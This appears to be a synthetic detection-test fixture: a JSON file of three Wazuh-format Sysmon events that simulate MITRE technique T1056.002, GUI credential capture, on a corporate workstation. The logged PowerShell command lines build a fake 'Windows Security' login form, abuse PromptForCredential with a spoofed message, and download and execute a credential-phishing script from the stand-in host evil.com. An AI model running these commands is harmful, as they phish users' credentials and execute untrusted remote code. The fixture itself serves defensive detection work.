@@ -1,0 +1,230 @@
+{
+  "_metadata": {
+    "attack_id": "T1056.002",
+    "variation": "001",
+    "name": "Input Capture: GUI Input Capture",
+    "description": "Capturing user input via GUI manipulation",
+    "expected_detection": "HIGH",
+    "kill_chain_phase": "collection",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Sysmon Event 1 - Fake login dialog",
+      "sequence": 1,
+      "timestamp": "2026-01-30T09:40:00.000Z",
+      "log": {
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 1: GUI Credential Phishing",
+          "id": "100100",
+          "mitre": {
+            "id": [
+              "T1056.002"
+            ],
+            "tactic": [
+              "Collection",
+              "Credential Access"
+            ],
+            "technique": [
+              "GUI Input Capture"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000063.000001",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-01-30 09:40:00.000",
+              "processGuid": "{GUI-001-0001-000000000001}",
+              "processId": "10700",
+              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "commandLine": "powershell.exe -c \"Add-Type -AssemblyName System.Windows.Forms; $form = New-Object Windows.Forms.Form; $form.Text = 'Windows Security'; $label = New-Object Windows.Forms.Label; $label.Text = 'Enter your credentials:'; $textbox = New-Object Windows.Forms.TextBox; $form.Controls.Add($label); $form.Controls.Add($textbox); $form.ShowDialog()\"",
+              "currentDirectory": "C:\\Users\\attacker\\",
+              "user": "CORP\\attacker",
+              "integrityLevel": "Medium",
+              "hashes": "SHA256=PS_HASH_1234567890ABCDEF1234567890ABCDEF1234567890",
+              "parentProcessGuid": "{GUI-001-0001-000000000000}",
+              "parentProcessId": "10700",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe",
+              "parentCommandLine": "cmd.exe"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Sysmon Event 1 - CredUIPromptForCredentials API abuse",
+      "sequence": 2,
+      "timestamp": "2026-01-30T09:40:05.000Z",
+      "log": {
+        "rule": {
+          "level": 14,
+          "description": "Sysmon - Event 1: Credential Prompt Abuse",
+          "id": "100100",
+          "mitre": {
+            "id": [
+              "T1056.002"
+            ],
+            "tactic": [
+              "Collection",
+              "Credential Access"
+            ],
+            "technique": [
+              "GUI Input Capture"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000063.000002",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-01-30 09:40:05.000",
+              "processGuid": "{GUI-001-0001-000000000002}",
+              "processId": "10800",
+              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "commandLine": "powershell.exe -c \"$cred = $host.ui.PromptForCredential('Windows Security','Please enter your network credentials','','',$cred)\"",
+              "currentDirectory": "C:\\Users\\attacker\\",
+              "user": "CORP\\attacker",
+              "integrityLevel": "Medium",
+              "hashes": "SHA256=PS_HASH_1234567890ABCDEF1234567890ABCDEF1234567890",
+              "parentProcessGuid": "{GUI-001-0001-000000000000}",
+              "parentProcessId": "10700",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe",
+              "parentCommandLine": "cmd.exe"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Sysmon Event 1 - Invoke-CredentialPhisher execution",
+      "sequence": 3,
+      "timestamp": "2026-01-30T09:40:10.000Z",
+      "log": {
+        "rule": {
+          "level": 14,
+          "description": "Sysmon - Event 1: Credential Phishing Tool",
+          "id": "100100",
+          "mitre": {
+            "id": [
+              "T1056.002"
+            ],
+            "tactic": [
+              "Collection",
+              "Credential Access"
+            ],
+            "technique": [
+              "GUI Input Capture"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000063.000003",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-01-30 09:40:10.000",
+              "processGuid": "{GUI-001-0001-000000000003}",
+              "processId": "10900",
+              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "commandLine": "powershell.exe -c \"IEX(New-Object Net.WebClient).DownloadString('http://evil.com/Invoke-CredentialPhisher.ps1'); Invoke-CredentialPhisher\"",
+              "currentDirectory": "C:\\Users\\attacker\\",
+              "user": "CORP\\attacker",
+              "integrityLevel": "Medium",
+              "hashes": "SHA256=PS_HASH_1234567890ABCDEF1234567890ABCDEF1234567890",
+              "parentProcessGuid": "{GUI-001-0001-000000000000}",
+              "parentProcessId": "10700",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe",
+              "parentCommandLine": "cmd.exe"
+            }
+          }
+        }
+      }
+    }
+  ]
+}
